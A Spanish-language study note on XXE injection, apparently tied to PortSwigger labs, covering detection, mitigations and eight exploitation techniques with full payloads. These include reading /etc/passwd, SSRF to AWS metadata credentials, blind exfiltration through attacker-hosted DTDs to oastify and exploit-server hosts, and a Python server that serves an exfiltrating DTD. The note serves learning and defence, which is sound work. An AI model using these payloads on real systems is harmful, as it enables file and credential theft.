-------
Tags: #xml #database #inyección #injection #explotación #Exploitation #blind  #wrappers #xxe 

-----------------
# 📑 Índice de Contenidos

- [[#Resumen|1. Resumen]]
	
- [[#📖 <span style="color 3498db">Definición y Conceptos Clave</span>|2. Definición y Conceptos clave]]
	  - [[#¿Qué es XXE?|2.1 ¿Qué es XXE?]]
	  - [[#DTD y tipos de entidades|2.2 DTD y tipos de entidades]]
	  - [[#XInclude|2.3 XInclude]]
	
- [[#Por qué es vulnerable una aplicación|3. Por qué es vulnerable una aplicación]]
	
- [[#🔎 <span style="color 9b59b6">Metodología de Detección</span>|4. Metodología de Detección]]
	  - [[#Detección rápida (checklist)|4.1 Detección rápida]]
	  - [[#Firmas y comportamientos observables|4.2 Firmas y comportamientos]]
	  - [[#Herramientas útiles|4.3 Herramientas]]
	
- [[#💥 <span style="color e74c3c">Técnicas de Explotación y ejemplos</span>|5. Técnicas de explotación]]
	  - [[#1) Lectura de archivos con entidades externas (direct XXE)|5.1 Lectura de archivos locales]]
	  - [[#2) SSRF / cloud instance metadata (ejemplo EC2)|5.2 SSRF vía XXE]]
	  - [[#3) XXE ciego con interacción out-of-band (OOB)|5.3 Blind XXE OOB]]
	  - [[#4) XXE ciego: exfiltración via DTD externa (server-side hosted DTD)|5.4 Exfiltración vía DTD]]
	  - [[#5) XXE ciego mediante errores forzados (filtrado por errores)|5.5 Error-based XXE]]
	  - [[#6) XInclude para leer archivos (payload en parámetro no XML / detección)|5.6 XInclude]]
	  - [[#7) XXE vía subida de imagen (SVG)|5.7 XXE en SVG]]
	  - [[#8) XXE usando DTD local (docbookx.dtd) y niveles de expansión|5.8 DTD local]]
	
- [[#Payloads (lista resumida)|6. Payloads]]
	
- [[#PoCs y scripts útiles|7. PoCs y Scripts]]
	
- [[#Mitigaciones y recomendaciones|8. Mitigaciones]]
	
- [[#Conclusión y buenas prácticas|9. Conclusión]]
	
- [[#Recursos adicionales (breve lista)|10. Recursos]]

---

## Resumen

XXE (XML External Entity) es una vulnerabilidad que aparece cuando un procesador XML interpreta entidades externas (SYSTEM, PUBLIC) o directivas DTD controladas por el atacante. Permite lectura de ficheros locales, SSRF, ejecución de requests OOB y, en casos complejos, escaladas mediante DTD anidadas y técnicas de exfiltración. Es crítico en APIs que aceptan XML (SOAP, REST con payload XML, parsers XML en uploads como SVG) y en sistemas que procesan documentos XML sin restringir resoluciones externas.

---

## 📖 <span style="color:#3498db">Definición y Conceptos Clave</span>

### ¿Qué es XXE?

XXE es la explotación de la capacidad del procesador XML de resolver entidades externas definidas en una DTD. Una entidad externa puede referir a `file://`, `http://`, `ftp://`, `jar:`, `gopher:` y otros esquemas, dependiendo del parser y configuración.

### DTD y tipos de entidades

- **Entidad general**: `<!ENTITY name "value">` (se usa en el contenido XML como `&name;`).
    
- **Entidad externa (SYSTEM)**: `<!ENTITY ext SYSTEM "file:///etc/passwd">` → el parser intenta resolver y sustituir por el contenido del recurso.
    
- **Parameter entity (entidad de parámetro)**: `<!ENTITY % name SYSTEM "...">` usadas dentro de DTDs y para construir DTDs dinámicas.
    
- **DTD interna / externa**: DTD inline (dentro del documento) o referenciada externamente.
    

### XInclude

XInclude permite incluir contenido de otros recursos XML/texto en el documento usando el espacio de nombres `http://www.w3.org/2001/XInclude`. Ejemplo: `<xi:include href="file:///etc/passwd" parse="text"/>`. Algunos parsers soportan XInclude y pueden procesarlo si está habilitado.

---

## Por qué es vulnerable una aplicación

1. **Parser XML configurado con resolution/enabling of external entities activada** (por ejemplo, `XMLInputFactory` o `DocumentBuilderFactory` con external entity resolution on). Muchos frameworks históricos la tenían por defecto.
    
2. **Inputs controlados por usuario que llegan sin validación** (body XML, campos que reciben XML embebido, uploads tipo SVG, attachments).
    
3. **Uso de librerías con soporte DTD/XXE por defecto** (ej. libxml2, Xerces, PHP-libxml antes de saneamiento, Java SAX/DOM si no se inhabilita).
    
4. **Output reflejado en la respuesta** (que permita ver el contenido leído) o posibilidad de OOB (el servidor puede alcanzar recursos externos o el atacante puede recibir callbacks).
    

---

## 🔎 <span style="color:#9b59b6">Metodología de Detección</span>

### Detección rápida (checklist)

- ¿El endpoint acepta `Content-Type: application/xml` o `text/xml`? ¿También `application/x-www-form-urlencoded` con parámetros que contienen XML?
    
- ¿Hay endpoints que aceptan uploads (SVG, XML, DOCX, ODT)?
    
- ¿Se incluyen librerías server-side conocidas por XXE (libxml2, lxml, Java Xerces, PHP DOMDocument)?
    
- Pruebas rápidas: enviar DTD con `<!ENTITY xxe SYSTEM "file:///etc/passwd">` y ver si aparece `/etc/passwd` en la respuesta.
    
- Probar OOB con un dominio controlado (Burp Collaborator / OAST / interactsh). Si el servidor realiza una petición al dominio atacante, XXE ciego posible.
    
- Test para XInclude: inyectar payload `xmlns:xi` y `<xi:include parse="text" href="file:///etc/passwd"/>` en campos reflejados.
    

### Firmas y comportamientos observables

- **Errores XML**: mensajes que contienen rutas absolutos, stack traces, o mensajes del parser (e.g. `Entity 'xxe' not defined`, `External entity resolution disabled` puede indicar intento)
    
- **Time-based**: si el parser realiza fetchs que generan latencia (e.g. SSRF que espera respuesta lenta)
    
- **OOB**: conexiones DNS/HTTP a servidor externo detectadas
    

### Herramientas útiles

- Burp Suite + Collaborator / OAST / Interactsh
    
- xmlsec, xsltproc para pruebas locales
    
- Nmap NSE scripts y scanners especializados (enum-xxe)
    
- Arachni/Acunetix in some cases
    

---

## 💥 <span style="color:#e74c3c">Técnicas de Explotación y ejemplos</span>

### 1) Lectura de archivos con entidades externas (direct XXE)

**Payload básico** (leer `/etc/passwd`):

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
<!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<stockCheck>
    <productId>
        &xxe;
    </productId>
    <storeId>
        1
    </storeId>
</stockCheck>
```

**Explicación**: la DTD define una entidad externa llamada `xxe` que apunta al fichero. Cuando el parser expande `&xxe;` inserta el contenido de `/etc/passwd`.

**Detección/confirmación**: respuesta refleja líneas típicas de passwd; si no se refleja, probar técnicas OOB.

---

### 2) SSRF / cloud instance metadata (ejemplo EC2)

**Payload**:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
    <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin">
]>
<stockCheck>
    <productId>
        &xxe;
    </productId>
    <storeId>
        1
    </storeId>
</stockCheck>
```

**Explicación**: el parser realiza una petición HTTP hacia la IP 169.254.169.254 (metadata AWS). Si esta petición es permitida desde el servidor, la respuesta (por ejemplo el rol o credenciales) será insertada.

**Impacto**: exfiltración de credenciales temporales IAM → compromete la instancia.

---

### 3) XXE ciego con interacción out-of-band (OOB)

**Payload (ciego OOB directo)**:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
<!ENTITY xxe SYSTEM "https://n8w59hfnf94y65hge8r60xwnkeq5e32s.oastify.com">
]>
<stockCheck>
    <productId>
        &xxe;
    </productId>
    <storeId>
        1
    </storeId>
</stockCheck>
```

**Explicación**: si el parser intenta resolver la entidad externa, realizará una petición HTTP(S) al dominio atacante (interactsh/Burp). Monitorizar callbacks para confirmar la vulnerabilidad.

---

### 4) XXE ciego: exfiltración via DTD externa (server‑side hosted DTD)

**Petición**:

>!Importante: aunque ponga XML parser error, mirar los log del exploit server para ver si esta haciendose la petición

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
    <!ENTITY % xxe SYSTEM "https://exploit-0af6000703efbb0780c398f1012c0014.exploit-server.net/exploit">
    %xxe;
]>
<stockCheck>
    <productId>1</productId>
    <storeId>1</storeId>
</stockCheck>
```

**Contenido en el servidor atacante (`/exploit`)**:

```
<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'https://t2w1dotnosywwi4qeqfo20u24takynmc.oastify.com/?data=%file;'>">
%eval;
%exfil;
```

**Explicación**: el parser descarga la DTD externa, la evalúa introduciendo entidades que apuntan a archivos locales y construye una entidad `exfil` que apunta al servidor atacante con el contenido del fichero como parámetro. Al resolver `%exfil;` el parser realiza una petición hacia el dominio atacante con el contenido exfiltrado.

**Notas**: este método es potente porque evita reflejar contenido en la respuesta HTTP del servidor vulnerable — la exfiltración se hace vía callbacks.

---

### 5) XXE ciego mediante errores forzados (filtrado por errores)

**Petición**:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "https://exploit-server/.../exploit"> %xxe;]>
<stockCheck>
    <productId>
         1
    </productId>
    <storeId>
         1
    </storeId>
</stockCheck>
```

**Contenido en servidor atacante**:

```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY % exfil SYSTEM 'file://noexisto/%file;'>">
%eval;
%exfil;
```

**Explicación**: este payload fuerza un `SYSTEM 'file://noexisto/<file>'`. Algunos parsers incluyen mensajes de error o paths en la respuesta de error; si el servidor devuelve el error con la ruta o info del sistema (por ejemplo en logs o en respuesta XML), se puede inferir el contenido del fichero vía errores.

---

### 6) XInclude para leer archivos (payload en parámetro no XML / detección)

**Payload** (en un parámetro `productId` enviado como form-urlencoded):

```http
productId=<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>&storeId=1
```

Si el servidor interpreta ese parámetro como XML y aplica XInclude, se incluirá el contenido del archivo.

**Detección**:

- Aunque la petición no parezca XML, buscar campos que luego se parseen como XML (campos `productId`, `payload`, `document` o parámetros que aparezcan reflejados en respuesta con `<`/`>` o transformados por el servidor).
    
- Test: enviar un `productId` con `xmlns:xi` y ver si se refleja o produce comportamiento distinto.
    

---

### 7) XXE vía subida de imagen (SVG)

**Contexto**: muchos sistemas permiten subir imágenes; los SVG son XML. Si la aplicación procesa el SVG (p. ej. rasteriza con librerías que resuelven entidades) se puede ejecutar XXE.

**Payload (multipart file) — archivo `b.svg`**:

```
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]>
<svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1">
   <text font-size="16" x="0" y="16">&xxe;</text>
</svg>
```

**Detección**:

- Revisar endpoints que aceptan multipart/form-data y `Content-Type: image/svg+xml`.
    
- Buscar parámetros `filename` con extension `.svg` o `image/svg+xml` y punto de procesamiento (thumbnail generation, imagemagick, librerías server-side).
    
- Si la app valida solo por extensión pero procesa el XML con libxml, puede resolverse la entidad.
    

---

### 8) XXE usando DTD local (docbookx.dtd) y niveles de expansión

1. ¿Cómo averiguo qué DTDs existen en el servidor?
Como no tienes acceso al sistema de archivos, tienes que usar el propio parser XML como un escáner de puertos, pero para archivos.

La técnica del Error 200 vs Error 500:
Envías una petición con una referencia a un archivo DTD común.

Si el servidor responde 200 OK (o el mensaje normal): La DTD existe.

Si el servidor responde 500 Internal Server Error (indicando que no encontró el recurso): La DTD no existe.

Payload de enumeración:

```XML
<!DOCTYPE foo [
    <!ENTITY % check SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
    %check;
]>
<root>
    test
</root>
```

Lista de rutas comunes para probar (Fuzzing):
Debes hacer un "intruder" en Burp con estas rutas típicas de Linux (donde suelen estar instaladas por defecto):

1 - `/usr/share/yelp/dtd/docbookx.dtd` (Muy común en Ubuntu/Debian)

2 - `/usr/share/xml/fontconfig/fonts.dtd`

3 - `/usr/share/xml/scrollkeeper/dtds/scrollkeeper-omf.dtd`

4 - `/usr/share/xml/metacity/metacity-theme.dtd`


**Payload** (usa `docbookx.dtd` instalado localmente):

```xml
<!DOCTYPE foo [
    <!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
    <!ENTITY % ISOamso '
        <!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
    '>
    %local_dtd;
]>
```

**Explicación detallada de niveles de expansión y codificación**:

- `&#x25;` es la entidad HTML para `%` (U+0025). El motivo de usar `&#x25;` dentro de la DTD es **inyectar un `%` en el contexto del DTD** sin que el parser lo interprete antes de tiempo por el motor HTML. Cuando el parser construye la DTD, esas referencias se convierten en `%%` o `%` como corresponde.
    
- `&#x26;#x25;` produce `&#x25;` en el documento, lo que a su vez representa `%`. Es una técnica de doble-encoding que permite introducir `parameter entity` markers (`%name;`) dentro de una entidad que fue cargada desde un recurso externo.
    
- El flujo de expansión típico en este payload:
    
    1. El parser descarga `docbookx.dtd` (o la DTD local referenciada) y luego inyecta la entidad `%ISOamso;` definida inline.
        
    2. Dentro de `%ISOamso;` se definen otras entidades `%file` y `%eval` pero usando encodeos (`&#x25;`) para que la secuencia conserve la sintaxis válida cuando sea evaluada por el parser.
        
    3. Al evaluar `%eval;`, se define otra entidad `error` cuyo `SYSTEM` es `file:///nonexistent/%file`.
        
    4. Finalmente `%error;` se expande y el intento de resolver `file:///nonexistent/<contenido_de_file>` puede causar una petición o un error que incluya `<contenido_de_file>` según el parser.
        

**Por qué es necesario el doble encoding**:

- El DTD externo y el DTD inline pasan por fases de parseo y normalización. Algunos caracteres (`%`, `&`) tienen significados en dos fases: HTML decode y luego DTD parse. Emplear `&#x25;` y variantes permite construir dinámicamente directivas DTD que el parser únicamente interpretará cuando la DTD externa sea inyectada y re‑parseada por el motor XML.
    

**Dónde aplicar**: cualquier DTD preinstalada en el sistema (docbookx, yelp, librerías localizadas) que permita `ENTITY %` y que el parser pueda incluir.

---

## Payloads (lista resumida)

|Técnica|Payload de ejemplo|Comentarios|
|---|--:|---|
|Lectura fichero|Ver sección "Lectura de archivos"|Direct expansion|
|SSRF metadata|Ver sección "SSRF"|169.254.169.254 ejemplo AWS|
|OOB directo|`<!ENTITY xxe SYSTEM "https://my-oob/">`|Confirm via Collaborator|
|DTD externa exfil|Petición con `%xxe;` y DTD remoto|Requiere hosting del DTD|
|XInclude|`<xi:include href="file:///etc/passwd" parse="text"/>`|Parametros no XML que luego parsea|
|SVG upload|SVG con DTD internal|Revisa rasterización en servidor|

_(Los payloads completos están en las secciones anteriores y en los ejemplos concretos que solicitaste.)_

---

## PoCs y scripts útiles

### 1) Python — envío de XML simple

```python
import requests
url = 'https://target.example/api'
xml = open('payload.xml','rb').read()
resp = requests.post(url, data=xml, headers={'Content-Type':'application/xml'}, verify=False)
print(resp.status_code)
print(resp.text[:1000])
```

### 2) Python — servidor simple para DTD externo (captura requests)

```python
from http.server import BaseHTTPRequestHandler, HTTPServer
class Handler(BaseHTTPRequestHandler):
    def do_GET(self):
        print('GET', self.path)
        self.send_response(200)
        self.send_header('Content-Type','application/xml')
        self.end_headers()
        # devolver DTD payload que exfiltra
        dtd = '''<!ENTITY % file SYSTEM "file:///etc/passwd">\n<!ENTITY % eval "<!ENTITY % exfil SYSTEM 'https://YOUR-OOB/?data=%file;'>">\n%eval;\n%exfil;'''
        self.wfile.write(dtd.encode())

HTTPServer(('0.0.0.0',8000), Handler).serve_forever()
```

Usa `requests` para apuntar la DTD SYSTEM a `http://<your-ip>:8000/`.

### 3) Burp/Interactsh

- Genera un dominio interactivo y monitoriza callbacks para confirmar XXE OOB.
    
---
## Mitigaciones y recomendaciones

1. **Deshabilitar resolución de entidades externas** en todos los parsers XML (recomendación primaria). Ejemplos:
    
    - Java (JAXP): `factory.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);` y deshabilitar external-general-entities y external-parameter-entities.
        
    - libxml2 / PHP: `libxml_disable_entity_loader(true)` en versiones antiguas; en versions recientes seguir la guía del vendor.
        
    - Python lxml: usar `resolve_entities=False` o `XMLParser(no_network=True)`.
        
2. **Validar y filtrar inputs** que contengan XML (rechazar DTDs, `<!DOCTYPE`), o usar una whitelist de tags permitidos.
    
3. **Saneamiento de uploads**: rechazar SVG si no es necesario; rasterizar en un sandbox que no resuelva entidades; convertir SVG a PNG en un entorno aislado.
    
4. **Limitar egress/network** desde servidores a internet y a metadata IPs (169.254.169.254). Implementar firewall rules locales.
    
5. **Monitoreo y WAF**: reglas que detecten `<!DOCTYPE` o `SYSTEM "file://` en tráfico entrante.
    
6. **Least privilege**: reducir permisos de archivos del proceso y deshabilitar acceso a recursos innecesarios.
    

---
## Conclusión y buenas prácticas

- XXE es una vulnerabilidad antigua pero aún frecuente; su prevención es simple (desactivar resolución externa) pero requiere disciplina en parsers y librerías.
    
- Para auditoría: combina técnicas directas, OOB y análisis de uploads. Usa tooling (Burp + interactsh) y validación manual.
    
- Organiza los apuntes en Obsidian por técnica; añade casos reales y snippets reproducibles.
    

---
## Recursos adicionales (breve lista)

- OWASP XXE Cheat Sheet
    
- Documentación de mitigación de libxml2, Java JAXP, Python lxml
    
- PortSwigger labs: XXE / XXE OOB
    
---


- Cheat Sheet y material de Portswigger: [Enlace](https://portswigger.net/web-security/xxe#what-is-xml-external-entity-injection)
